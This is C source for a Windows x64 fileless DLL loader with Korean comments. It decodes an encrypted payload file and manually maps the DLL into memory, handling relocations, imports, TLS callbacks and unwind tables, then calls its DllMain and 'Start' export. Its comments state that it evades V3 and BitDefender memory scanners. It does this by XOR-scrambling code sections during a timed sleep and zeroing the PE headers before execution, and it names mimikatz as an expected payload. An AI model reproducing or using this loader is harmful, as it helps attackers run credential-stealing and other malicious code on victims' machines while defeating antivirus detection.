#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "hsf_decoder.h"

typedef void (*StartFunc)(void);
typedef BOOL (WINAPI *DllMainFunc)(HINSTANCE, DWORD, LPVOID);

static void secure_zero(void *memory, size_t size)
{
    volatile unsigned char *cursor = (volatile unsigned char *)memory;

    while (size > 0U) {
        *cursor++ = 0U;
        --size;
    }
}

static unsigned char *read_file(const char *path, size_t *size)
{
    FILE *file;
    long file_size;
    unsigned char *buffer;

    if (path == NULL || size == NULL) {
        return NULL;
    }

    *size = 0U;
    file = fopen(path, "rb");
    if (file == NULL) {
        fprintf(stderr, "[!] 파일 열기 실패: %s\n", path);
        return NULL;
    }

    if (fseek(file, 0, SEEK_END) != 0) {
        fprintf(stderr, "[!] 파일 크기 확인 실패\n");
        fclose(file);
        return NULL;
    }

    file_size = ftell(file);
    if (file_size <= 0) {
        fprintf(stderr, "[!] 암호화 파일이 비어 있거나 크기 확인 실패\n");
        fclose(file);
        return NULL;
    }

    rewind(file);
    *size = (size_t)file_size;
    buffer = (unsigned char *)malloc(*size);
    if (buffer == NULL) {
        fprintf(stderr, "[!] 메모리 할당 실패\n");
        fclose(file);
        return NULL;
    }

    if (fread(buffer, 1U, *size, file) != *size) {
        fprintf(stderr, "[!] 파일 읽기 실패\n");
        free(buffer);
        fclose(file);
        return NULL;
    }

    fclose(file);
    return buffer;
}

static int is_valid_pe_image(const unsigned char *buffer, size_t size)
{
    IMAGE_DOS_HEADER dos_header;
    IMAGE_FILE_HEADER file_header;
    DWORD signature;
    WORD optional_magic;
    size_t nt_offset;
    size_t optional_offset;

    if (buffer == NULL || size < sizeof(dos_header)) {
        return 0;
    }

    memcpy(&dos_header, buffer, sizeof(dos_header));
    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE || dos_header.e_lfanew < 0) {
        return 0;
    }

    nt_offset = (size_t)dos_header.e_lfanew;
    if (nt_offset > size || size - nt_offset < sizeof(signature)) {
        return 0;
    }

    memcpy(&signature, buffer + nt_offset, sizeof(signature));
    if (signature != IMAGE_NT_SIGNATURE) {
        return 0;
    }

    nt_offset += sizeof(signature);
    if (nt_offset > size || size - nt_offset < sizeof(file_header)) {
        return 0;
    }

    memcpy(&file_header, buffer + nt_offset, sizeof(file_header));
    if ((file_header.Characteristics & IMAGE_FILE_DLL) == 0U) {
        return 0;
    }

    optional_offset = nt_offset + sizeof(file_header);
    if (file_header.SizeOfOptionalHeader < sizeof(optional_magic)
        || optional_offset > size
        || size - optional_offset < file_header.SizeOfOptionalHeader) {
        return 0;
    }

    memcpy(&optional_magic, buffer + optional_offset, sizeof(optional_magic));
    return optional_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC
        || optional_magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
}

/*
 * 파일리스 수동 매핑 (x64 DLL 전용).
 * VirtualAlloc + 헤더/섹션 복사 + 재배치 + 임포트 + TLS + 섹션 보호.
 * 성공 시 이미지 base 를 out_base 에 넣고 DllMain / Start 포인터 반환.
 *
 * baseline: 헤더 스톰프/암호화/sleep 등 우회 기법은 아직 없음.
 * 이 상태의 탐지 여부를 먼저 측정한 뒤 층을 하나씩 얹는다.
 */
static int map_dll_from_memory(
    const unsigned char *raw,
    size_t raw_size,
    unsigned char **out_base,
    DllMainFunc *out_dllmain,
    void **out_start
)
{
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt_src;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_SECTION_HEADER *sec;
    unsigned char *base = NULL;
    ULONG_PTR preferred_base;
    ULONG_PTR delta;
    DWORD img_size;
    WORD i;

    if (out_base == NULL || out_dllmain == NULL || out_start == NULL) {
        return 0;
    }
    *out_base = NULL;
    *out_dllmain = NULL;
    *out_start = NULL;

    dos = (IMAGE_DOS_HEADER *)raw;
    nt_src = (IMAGE_NT_HEADERS64 *)(raw + dos->e_lfanew);
    if (nt_src->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        fprintf(stderr, "[!] 이 로더는 x64 DLL 만 지원합니다\n");
        return 0;
    }

    img_size = nt_src->OptionalHeader.SizeOfImage;
    preferred_base = (ULONG_PTR)nt_src->OptionalHeader.ImageBase;

    base = (unsigned char *)VirtualAlloc(
        (LPVOID)preferred_base, img_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (base == NULL) {
        base = (unsigned char *)VirtualAlloc(
            NULL, img_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (base == NULL) {
        fprintf(stderr, "[!] VirtualAlloc 실패 (오류 코드: %lu)\n", GetLastError());
        return 0;
    }

    /* 헤더 복사 */
    memcpy(base, raw, nt_src->OptionalHeader.SizeOfHeaders);

    /* 섹션 복사 */
    sec = IMAGE_FIRST_SECTION(nt_src);
    for (i = 0U; i < nt_src->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->SizeOfRawData == 0U) {
            continue;
        }
        if ((size_t)sec->PointerToRawData + sec->SizeOfRawData > raw_size) {
            fprintf(stderr, "[!] 섹션이 원본 버퍼 범위를 초과합니다\n");
            VirtualFree(base, 0, MEM_RELEASE);
            return 0;
        }
        memcpy(base + sec->VirtualAddress,
               raw + sec->PointerToRawData,
               sec->SizeOfRawData);
    }

    nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    delta = (ULONG_PTR)base - preferred_base;

    /* Relocation */
    if (delta != 0U) {
        IMAGE_DATA_DIRECTORY *reloc_dir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir->VirtualAddress && reloc_dir->Size) {
            IMAGE_BASE_RELOCATION *r =
                (IMAGE_BASE_RELOCATION *)(base + reloc_dir->VirtualAddress);
            unsigned char *end = (unsigned char *)r + reloc_dir->Size;
            while ((unsigned char *)r < end && r->VirtualAddress
                   && r->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                unsigned char *rb = base + r->VirtualAddress;
                WORD *rd = (WORD *)((unsigned char *)r + sizeof(IMAGE_BASE_RELOCATION));
                DWORD n = (r->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))
                          / sizeof(WORD);
                DWORD k;
                for (k = 0U; k < n; ++k) {
                    WORD type = (WORD)(rd[k] >> 12);
                    WORD off = (WORD)(rd[k] & 0x0FFFU);
                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONG_PTR *)(rb + off) += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(ULONG *)(rb + off) += (ULONG)delta;
                    }
                }
                r = (IMAGE_BASE_RELOCATION *)((unsigned char *)r + r->SizeOfBlock);
            }
        } else {
            fprintf(stderr, "[!] delta 있음에도 재배치 디렉터리 없음\n");
            VirtualFree(base, 0, MEM_RELEASE);
            return 0;
        }
    }

    /* Imports */
    {
        IMAGE_DATA_DIRECTORY *imp_dir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (imp_dir->VirtualAddress && imp_dir->Size) {
            IMAGE_IMPORT_DESCRIPTOR *desc =
                (IMAGE_IMPORT_DESCRIPTOR *)(base + imp_dir->VirtualAddress);
            while (desc->Name) {
                const char *dll_name = (const char *)(base + desc->Name);
                HMODULE hm = LoadLibraryA(dll_name);
                IMAGE_THUNK_DATA *ot;
                IMAGE_THUNK_DATA *ft;
                if (hm == NULL) {
                    fprintf(stderr, "[!] LoadLibrary(%s) 실패\n", dll_name);
                    VirtualFree(base, 0, MEM_RELEASE);
                    return 0;
                }
                ot = (IMAGE_THUNK_DATA *)(base + desc->OriginalFirstThunk);
                ft = (IMAGE_THUNK_DATA *)(base + desc->FirstThunk);
                if (desc->OriginalFirstThunk == 0U) {
                    ot = ft;
                }
                while (ot->u1.AddressOfData) {
                    FARPROC fn;
                    if (IMAGE_SNAP_BY_ORDINAL(ot->u1.Ordinal)) {
                        fn = GetProcAddress(hm,
                            (LPCSTR)IMAGE_ORDINAL(ot->u1.Ordinal));
                    } else {
                        IMAGE_IMPORT_BY_NAME *ibn =
                            (IMAGE_IMPORT_BY_NAME *)
                            (base + (ULONG_PTR)ot->u1.AddressOfData);
                        fn = GetProcAddress(hm, ibn->Name);
                    }
                    if (fn == NULL) {
                        fprintf(stderr, "[!] 임포트 미해결 in %s\n", dll_name);
                        VirtualFree(base, 0, MEM_RELEASE);
                        return 0;
                    }
                    ft->u1.Function = (ULONG_PTR)fn;
                    ++ot;
                    ++ft;
                }
                ++desc;
            }
        }
    }

    /* 섹션 보호 — TLS/DllMain/Start 실행 전에 반드시 완료해야
     * .text 가 RX 로 바뀌어 코드 실행 가능 */
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0U; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        DWORD c = sec->Characteristics;
        DWORD prot = PAGE_NOACCESS;
        DWORD old;
        if (c & IMAGE_SCN_MEM_EXECUTE) {
            prot = (c & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE
                : (c & IMAGE_SCN_MEM_READ) ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
        } else if (c & IMAGE_SCN_MEM_WRITE) {
            prot = PAGE_READWRITE;
        } else if (c & IMAGE_SCN_MEM_READ) {
            prot = PAGE_READONLY;
        }
        if (prot != PAGE_NOACCESS) {
            VirtualProtect(base + sec->VirtualAddress,
                           sec->Misc.VirtualSize, prot, &old);
        }
    }

    /* x64 SEH/unwind 테이블 등록 — 이게 없으면 payload CRT init 내부
     * __try/__except 예외 발생 시 RtlDispatchException 이 unwind 정보 못 찾아
     * 조용히 프로세스 종료 (SilentlyExitProcess).
     * Windows 로더가 LoadLibrary 경로에서 자동으로 하는 일. */
    {
        IMAGE_DATA_DIRECTORY *exc_dir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (exc_dir->VirtualAddress && exc_dir->Size) {
            RUNTIME_FUNCTION *rf =
                (RUNTIME_FUNCTION *)(base + exc_dir->VirtualAddress);
            DWORD count = exc_dir->Size / (DWORD)sizeof(RUNTIME_FUNCTION);
            if (!RtlAddFunctionTable(rf, count, (DWORD64)base)) {
                fprintf(stderr,
                        "[!] RtlAddFunctionTable 실패 — SEH 예외 시 무해 종료 위험\n");
            } else {
                printf("[+] Unwind info 등록 완료 (%lu entries)\n",
                       (unsigned long)count);
            }
        }
    }

    /* TLS 콜백 — 이제 .text 가 RX 상태이므로 실행 안전 */
    {
        IMAGE_DATA_DIRECTORY *tls_dir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if (tls_dir->VirtualAddress && tls_dir->Size) {
            IMAGE_TLS_DIRECTORY64 *tls =
                (IMAGE_TLS_DIRECTORY64 *)(base + tls_dir->VirtualAddress);
            if (tls->AddressOfCallBacks) {
                PIMAGE_TLS_CALLBACK *cbs =
                    (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
                while (*cbs) {
                    (*cbs)(base, DLL_PROCESS_ATTACH, NULL);
                    ++cbs;
                }
            }
        }
    }

    /* DllMain 진입점 */
    if (nt->OptionalHeader.AddressOfEntryPoint) {
        *out_dllmain = (DllMainFunc)(base + nt->OptionalHeader.AddressOfEntryPoint);
    }

    /* Start export 검색 */
    {
        IMAGE_DATA_DIRECTORY *exp_dir =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (exp_dir->VirtualAddress && exp_dir->Size) {
            IMAGE_EXPORT_DIRECTORY *exp =
                (IMAGE_EXPORT_DIRECTORY *)(base + exp_dir->VirtualAddress);
            DWORD *names = (DWORD *)(base + exp->AddressOfNames);
            WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
            DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
            DWORD n;
            for (n = 0U; n < exp->NumberOfNames; ++n) {
                const char *nm = (const char *)(base + names[n]);
                if (strcmp(nm, "Start") == 0) {
                    *out_start = base + funcs[ords[n]];
                    break;
                }
            }
        }
    }

    *out_base = base;
    return 1;
}

/*
 * 섹션 XOR 암호화 (대칭 — 같은 함수로 encrypt/decrypt 둘 다)
 * ---------------------------------------------------------
 * 대상: EXECUTE 섹션(.text) + READ-only 섹션(.rdata/.pdata 등 정적 시그니처가 사는 영역)
 * 제외: WRITE 가능 섹션 (.data — 런타임 데이터, IAT 은 .rdata 상 있어 encrypt/decrypt 왕복으로 원복)
 *
 * 목적: 매핑 완료 후 XOR 로 시그니처 바이트를 뒤섞고 sleep 을 유지하다가
 *       V3/BitDefender 메모리 스캐너 주기(~2초)를 넘긴 뒤 원복.
 *       스캔이 sleep 구간에 걸리면 시그니처 매치 실패.
 *
 * 흐름: RX/R → VirtualProtect(RW) → XOR → VirtualProtect(원복)
 */
static void xor_sections(unsigned char *base, unsigned char key)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    int cnt = 0;
    WORD i;

    for (i = 0U; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        DWORD c = sec->Characteristics;
        int is_code = (c & IMAGE_SCN_MEM_EXECUTE) != 0;
        int is_readonly =
            (c & IMAGE_SCN_MEM_READ) && !(c & IMAGE_SCN_MEM_WRITE);
        unsigned char *dst;
        DWORD sz;
        DWORD old = 0;
        DWORD j;

        if (!is_code && !is_readonly) {
            continue;
        }
        dst = base + sec->VirtualAddress;
        sz = sec->Misc.VirtualSize;
        if (sz == 0U) {
            continue;
        }
        if (!VirtualProtect(dst, sz, PAGE_READWRITE, &old)) {
            continue;
        }
        for (j = 0U; j < sz; ++j) {
            dst[j] ^= key;
        }
        VirtualProtect(dst, sz, old, &old);
        ++cnt;
    }
    printf("[+] 섹션 XOR 0x%02X (%d sections)\n", (unsigned)key, cnt);
}

/*
 * PE 헤더 스톰프 — SizeOfHeaders 만큼 제로화.
 *
 * 헤더는 map_dll_from_memory 초기 VirtualAlloc(PAGE_READWRITE) 상태로 남아
 * 별도 섹션 보호를 받지 않으므로 VP 왕복 없이 바로 쓰기 가능.
 *
 * 목적: MEM_PRIVATE 영역에 intact 한 MZ/PE 시그니처 + 섹션 헤더가 있는
 *       "reflective 매핑" 패턴을 제거. Codex 분석에서 언급된
 *       "PE 헤더가 있는 수동 매핑 이미지" 신호 차단.
 *
 * 페이로드가 자기 이미지의 PE 헤더를 참조하는 경우엔 크래시 가능.
 * 일반 mimikatz/C 컴파일 EXE 는 접근하지 않음.
 */
static void stomp_headers(unsigned char *base)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    DWORD hdr_sz = nt->OptionalHeader.SizeOfHeaders;
    volatile unsigned char *p;
    DWORD i;

    if (hdr_sz == 0U || hdr_sz > 0x2000U) {
        hdr_sz = 0x1000U;
    }
    p = (volatile unsigned char *)base;
    for (i = 0U; i < hdr_sz; ++i) {
        p[i] = 0U;
    }
    printf("[+] PE 헤더 스톰프 완료 (%lu bytes)\n", (unsigned long)hdr_sz);
}

int main(int argc, char *argv[])
{
    const char *encoded_path;
    unsigned char *encoded_buffer;
    size_t encoded_size = 0U;
    unsigned char *decoded_buffer = NULL;
    size_t decoded_size = 0U;
    unsigned char *dll_base = NULL;
    DllMainFunc dllmain = NULL;
    void *start_fn = NULL;
    StartFunc start;
    HsfDecodeStatus decode_status;
    int result = 1;

    SetConsoleOutputCP(CP_UTF8);

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <hsf_mac_payload_path>\n", argv[0]);
        return 1;
    }

    encoded_path = argv[1];
    printf("[*] HSF MAC 페이로드: %s\n", encoded_path);

    encoded_buffer = read_file(encoded_path, &encoded_size);
    if (encoded_buffer == NULL) {
        return 1;
    }

    decode_status = hsf_decode_mac_buffer(
        encoded_buffer,
        encoded_size,
        &decoded_buffer,
        &decoded_size
    );
    secure_zero(encoded_buffer, encoded_size);
    free(encoded_buffer);

    if (decode_status != HSF_DECODE_OK) {
        fprintf(
            stderr,
            "[!] HSF MAC 디코딩 실패: %s\n",
            hsf_decode_status_string(decode_status)
        );
        return 1;
    }
    printf("[*] HSF MAC 디코딩 및 무결성 검증 완료\n");

    if (!is_valid_pe_image(decoded_buffer, decoded_size)) {
        fprintf(
            stderr,
            "[!] HSF 복원 결과가 유효한 PE DLL이 아닙니다. "
            "exe_to_dll 변환 결과를 인코딩했는지 확인하세요.\n"
        );
        secure_zero(decoded_buffer, decoded_size);
        free(decoded_buffer);
        return 1;
    }
    printf("[*] 복원된 DLL의 PE 검증 완료\n");

    /* 파일리스 수동 매핑 — 디스크에 절대 안 씀 */
    if (!map_dll_from_memory(decoded_buffer, decoded_size,
                             &dll_base, &dllmain, &start_fn)) {
        fprintf(stderr, "[!] 파일리스 수동 매핑 실패\n");
        secure_zero(decoded_buffer, decoded_size);
        free(decoded_buffer);
        return 1;
    }
    /* 원본 raw DLL 버퍼 즉시 파기 (매핑된 이미지만 남김) */
    secure_zero(decoded_buffer, decoded_size);
    free(decoded_buffer);
    printf("[*] DLL 파일리스 매핑 완료 @ %p\n", (void *)dll_base);

    /* 인메모리 XOR-at-rest — V3/BitDefender 메모리 스캐너 주기(~2s) 우회.
     * 시그니처 바이트를 XOR 로 뒤섞고 sleep 유지 → 스캐너가 쓰레기만 봄 → 복호화 후 실행 */
    {
        DWORD tick = GetTickCount();
        unsigned char key = (unsigned char)((tick & 0x3FU) | 0x40U);
        DWORD sleep_ms = 3000U + (tick % 2000U);

        xor_sections(dll_base, key);           /* encrypt */
        printf("[*] 스캐너 주기 회피 sleep %lu ms\n", (unsigned long)sleep_ms);
        Sleep(sleep_ms);
        xor_sections(dll_base, key);           /* decrypt (대칭) */
    }

    /* XOR decrypt 직후, 실행 직전 헤더 제거 → 메모리 스캐너의
     * "MEM_PRIVATE 에 PE 이미지" 휴리스틱 신호 차단 */
    stomp_headers(dll_base);

    /* DllMain(DLL_PROCESS_ATTACH) */
    if (dllmain != NULL) {
        BOOL ok = dllmain((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, NULL);
        printf("[*] DllMain 반환: %d\n", (int)ok);
        if (!ok) {
            fprintf(stderr, "[!] DllMain 이 FALSE 반환\n");
            goto cleanup;
        }
    }

    if (start_fn == NULL) {
        fprintf(stderr, "[!] Start export 를 찾지 못함\n");
        goto cleanup;
    }
    memcpy(&start, &start_fn, sizeof(start));

    printf("[*] Start 호출\n");
    start();
    printf("[*] Start 완료\n");
    result = 0;

cleanup:
    if (dll_base != NULL) {
        VirtualFree(dll_base, 0, MEM_RELEASE);
    }
    return result;
}
